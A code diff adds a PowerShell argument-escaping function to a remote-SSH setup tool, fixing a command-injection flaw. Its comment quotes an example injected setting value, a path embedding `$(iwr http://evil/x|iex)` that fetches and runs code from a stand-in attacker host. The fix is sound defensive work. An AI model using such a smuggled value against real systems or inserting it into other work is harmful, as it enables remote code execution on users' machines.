@@ -12,3 +12,18 @@
 export function escapeShellArg(value: string): string {
     return `'${value.replace(/'/g, `'\\''`)}'`;
 }
+
+/**
+ * PowerShell single-quote escaping: wrap in `'…'` and double every embedded `'`.
+ * Inside a PowerShell single-quoted string `'` is the *only* special character —
+ * `$(…)` subexpressions, `$var`, `"`, backticks, `;` and newlines are all
+ * literal — which is what makes this the Windows counterpart of
+ * `escapeShellArg`. Used by `src/serverSetup.ts` for every user-configurable
+ * value spliced into `src/scripts/server-setup.ps1`: those assignments used to
+ * be *double*-quoted, where `$(…)` is evaluated, so e.g.
+ * `remote.SSH.serverInstallPath: {"host": "C:\\srv$(iwr http://evil/x|iex)"}`
+ * executed attacker code on the remote at connect time.
+ */
+export function escapePowerShellArg(value: string): string {
+    return `'${value.replace(/'/g, `''`)}'`;
+}
